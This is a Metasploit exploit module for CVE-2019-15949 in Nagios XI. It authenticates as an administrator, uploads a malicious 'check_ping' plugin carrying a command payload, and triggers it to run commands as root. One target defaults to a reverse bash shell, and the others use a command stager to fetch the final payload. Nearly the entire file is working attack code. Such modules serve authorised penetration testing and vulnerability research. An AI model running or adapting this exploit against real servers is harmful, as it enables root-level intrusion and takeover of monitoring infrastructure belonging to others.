# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Nagios XI Authenticated Remote Command Execution&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a vulnerability in Nagios XI before 5.6.6 in
        order to execute arbitrary commands as root.

        The module uploads a malicious plugin to the Nagios XI server and then
        executes this plugin by issuing an HTTP GET request to download a
        system profile from the server. For all supported targets except Linux
        (cmd), the module uses a command stager to write the exploit to the
        target via the malicious plugin. This may not work if Nagios XI is
        running in a restricted Unix environment, so in that case the target
        must be set to Linux (cmd). The module then writes the payload to the
        malicious plugin while avoiding commands that may not be supported.

        Valid credentials for a user with administrative privileges are
        required. This module was successfully tested on Nagios XI 5.6.5
        running on CentOS 7. The module may behave differently against older
        versions of Nagios XI. See the documentation for more information.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;Jak Gibb&#039;,       # https://github.com/jakgibb/ - Discovery and exploit
          &#039;Erik Wynter&#039;     # @wyntererik - Metasploit
        ],
      &#039;References&#039;      =>
        [
          [&#039;CVE&#039;, &#039;2019-15949&#039;],
          [&#039;URL&#039;, &#039;https://github.com/jakgibb/nagiosxi-root-rce-exploit&#039;] #original PHP exploit
        ],
      &#039;Payload&#039;        => { &#039;BadChars&#039; => "\x00" },
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux (x86)&#039;, {
            &#039;Arch&#039; => ARCH_X86,
            &#039;Platform&#039; => &#039;linux&#039;,
            &#039;DefaultOptions&#039; => {
            }
          } ],
          [ &#039;Linux (x64)&#039;, {
            &#039;Arch&#039; => ARCH_X64,
            &#039;Platform&#039; => &#039;linux&#039;,
            &#039;DefaultOptions&#039; => {
            }
          } ],
          [ &#039;Linux (cmd)&#039;, {
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;,
            &#039;DefaultOptions&#039; => {
              &#039;PAYLOAD&#039;     => &#039;cmd/unix/reverse_bash&#039;
            },
            &#039;Payload&#039; => {
              &#039;Append&#039; => &#039; & disown&#039;,  # the payload must be disowned after execution, otherwise cleanup fails
              &#039;BadChars&#039; => "\""
            }
          } ]
        ],
      &#039;Privileged&#039;      => true,
      &#039;DisclosureDate&#039;  => &#039;Jul 29 2019&#039;,
      &#039;DefaultOptions&#039;  => {
        &#039;RPORT&#039; => 80,
        &#039;HttpClientTimeout&#039; => 2, #This is needed to close the connection to the server following the system profile download request.
        &#039;WfsDelay&#039;          => 10
        },
      &#039;DefaultTarget&#039;   => 1))
    register_options [
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path to NagiosXI&#039;, &#039;/&#039;]),
      OptString.new(&#039;USERNAME&#039;, [true, &#039;Username to authenticate with&#039;, &#039;nagiosadmin&#039;]),
      OptString.new(&#039;PASSWORD&#039;, [true, &#039;Password to authenticate with&#039;, &#039;&#039;])
    ]

    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [false, &#039;Override check result&#039;, false])
    ]
    import_target_defaults
  end

  def check
    vprint_status("Running check")

    #visit Nagios XI login page to obtain the nsp value required for authentication
    res = send_request_cgi &#039;uri&#039; => normalize_uri(target_uri.path, &#039;/nagiosxi/login.php&#039;)

    unless res
      return CheckCode::Unknown(&#039;Connection failed&#039;)
    end

    unless res.code == 200 && res.body.include?(&#039;Nagios XI&#039;)
      return CheckCode::Safe(&#039;Target is not a Nagios XI application.&#039;)
    end

    @nsp = res.body.scan(/nsp_str = "([a-z0-9]+)/).flatten.first rescue &#039;&#039;

    if @nsp.to_s.eql? &#039;&#039;
      return CheckCode::NoAccess, &#039;Could not retrieve nsp value, making authentication impossible.&#039;
    end

    #Attempt to authenticate
    @username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
    cookie = res.get_cookies.delete_suffix(&#039;;&#039;) #remove trailing semi-colon

    auth_res = send_request_cgi({
      &#039;uri&#039;          => normalize_uri(target_uri.path, &#039;/nagiosxi/login.php&#039;),
      &#039;method&#039;       => &#039;POST&#039;,
      &#039;cookie&#039;       => cookie,
      &#039;vars_post&#039;    => {
        nsp: @nsp,
        page:  &#039;auth&#039;,
        debug: &#039;&#039;,
        pageopt: &#039;login&#039;,
        username: @username,
        password: password,
        loginButton: &#039;&#039;
      }
    })

    unless auth_res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    unless auth_res.code == 302 && auth_res.headers[&#039;Location&#039;] == "index.php"
      fail_with Failure::NoAccess, &#039;Authentication failed. Please provide a valid username and password.&#039;
    end

    #Check Nagios XI version - this requires a separate request because following the redirect doesn&#039;t work
    @cookie = auth_res.get_cookies.delete_suffix(&#039;;&#039;) #remove trailing semi-colon
    @cookie = @cookie.split().last #app returns 3 cookies, we need only the last one
    version_check = send_request_cgi({
      &#039;uri&#039;          => normalize_uri(target_uri.path, &#039;/nagiosxi/index.php&#039;),
      &#039;method&#039;       => &#039;GET&#039;,
      &#039;cookie&#039;       => @cookie,
      &#039;nsp&#039;          => @nsp
    })

    unless version_check
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    unless version_check.code == 200 && version_check.body.include?(&#039;Home Dashboard&#039;)
      fail_with Failure::NoAccess, &#039;Authentication failed. Please provide a valid username and password.&#039;
    end

    @version = version_check.body.scan(/product=nagiosxi&version=(\d+\.\d+\.\d+)/).flatten.first rescue &#039;&#039;
    if @version.to_s.eql? &#039;&#039;
      return CheckCode::Detected(&#039;Could not determine Nagios XI version.&#039;)
    end

    @version = Gem::Version.new @version

    unless @version <= Gem::Version.new(&#039;5.6.5&#039;)
      return CheckCode::Safe("Target is Nagios XI with version #{@version}.")
    end

    CheckCode::Appears("Target is Nagios XI with version #{@version}.")
  end

  def check_plugin_permissions
    res = send_request_cgi({
      &#039;uri&#039;          => normalize_uri(target_uri.path, &#039;/nagiosxi/admin/monitoringplugins.php&#039;),
      &#039;method&#039;       => &#039;GET&#039;,
      &#039;cookie&#039;       => @cookie,
      &#039;nsp&#039;          => @nsp
    })

    unless res
      fail_with Failure::Unreachable, &#039;Connection failed&#039;
    end

    unless res.code == 200 && res.body.include?(&#039;Manage Plugins&#039;)
      fail_with(Failure::NoAccess, "The user #{@username} does not have permission to edit plugins, which is required for the exploit to work.")
    end

    @plugin_nsp = res.body.scan(/nsp_str = "([a-z0-9]+)/).flatten.first rescue &#039;&#039;
    if @plugin_nsp.to_s.eql? &#039;&#039;
      fail_with Failure::NoAccess, &#039;Failed to obtain the nsp value required for the exploit to work.&#039;
    end

    @plugin_cookie = res.get_cookies.delete_suffix(&#039;;&#039;) #remove trailing semi-colon
  end

  def execute_command(cmd, opts = {})
    print_status("Uploading malicious &#039;check_ping&#039; plugin...")
    boundary = rand_text_numeric(14)
    post_data = "-----------------------------#{boundary}\n"
    post_data << "Content-Disposition: form-data; name=\"upload\"\n\n1\n"
    post_data << "-----------------------------#{boundary}\n"
    post_data << "Content-Disposition: form-data; name=\"nsp\"\n\n"
    post_data << "#{@plugin_nsp}\n"
    post_data << "-----------------------------#{boundary}\n"
    post_data << "Content-Disposition: form-data; name=\"MAX_FILE_SIZE\"\n\n20000000\n"
    post_data << "-----------------------------#{boundary}\n"
    post_data << "Content-Disposition: form-data; name=\"uploadedfile\"; filename=\"check_ping\"\n" #the exploit doesn&#039;t work with a random filename
    post_data << "Content-Type: text/plain\n\n"
    post_data << "#{cmd}\n"
    post_data << "-----------------------------#{boundary}--\n"

    res = send_request_cgi({
      &#039;uri&#039;          => normalize_uri(target_uri.path, &#039;/nagiosxi/admin/monitoringplugins.php&#039;),
      &#039;method&#039;       => &#039;POST&#039;,
      &#039;ctype&#039;        => "multipart/form-data; boundary=---------------------------#{boundary}", #this needs to be specified here, otherwise the default value is sent in the header
      &#039;cookie&#039;       => @plugin_cookie,
      &#039;data&#039;         => post_data
    })

    unless res
      fail_with Failure::Unreachable, &#039;Upload failed&#039;
    end

    unless res.code == 200 && res.body.include?(&#039;New plugin was installed successfully&#039;)
      fail_with Failure::Unknown, &#039;Failed to upload plugin.&#039;
    end

    @plugin_installed = true
  end

  def execute_payload #This request will timeout. It has to, for the exploit to work.
    print_status("Executing plugin...")
    res = send_request_cgi({
      &#039;uri&#039;          => normalize_uri(target_uri.path, &#039;/nagiosxi/includes/components/profile/profile.php&#039;),
      &#039;method&#039;       => &#039;GET&#039;,
      &#039;cookie&#039;       => @cookie,
      &#039;vars_get&#039; => { cmd: &#039;download&#039; }
    })
  end

  def cleanup()
    return unless @plugin_installed

    print_status("Deleting malicious &#039;check_ping&#039; plugin...")
    res = send_request_cgi({
      &#039;uri&#039;          => normalize_uri(target_uri.path, &#039;/nagiosxi/admin/monitoringplugins.php&#039;),
      &#039;method&#039;       => &#039;GET&#039;,
      &#039;cookie&#039;       => @plugin_cookie,
      &#039;vars_get&#039; => {
        delete: &#039;check_ping&#039;,
        nsp: @plugin_nsp
      }
    })

    unless res
      print_warning("Failed to delete the malicious &#039;check_ping&#039; plugin: Connection failed. Manual cleanup is required.")
      return
    end

    unless res.code == 200 && res.body.include?(&#039;Plugin deleted&#039;)
      print_warning("Failed to delete the malicious &#039;check_ping&#039; plugin. Manual cleanup is required.")
      return
    end

    print_good("Plugin deleted.")
  end

  def exploit
    unless [CheckCode::Detected, CheckCode::Appears].include? check
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    if @version
      print_status("Found Nagios XI application with version #{@version}.")
    end

    check_plugin_permissions
    vprint_status("User #{@username} has the required permissions on the target.")

    if target.arch.first == ARCH_CMD
      execute_command(payload.encoded)
      message = "Waiting for the payload to connect back..."
    else
      execute_cmdstager(background: true)
      message = "Waiting for the plugin to request the final payload..."
    end
    print_good("Successfully uploaded plugin.")
    execute_payload
    print_status "#{message}"
  end
end

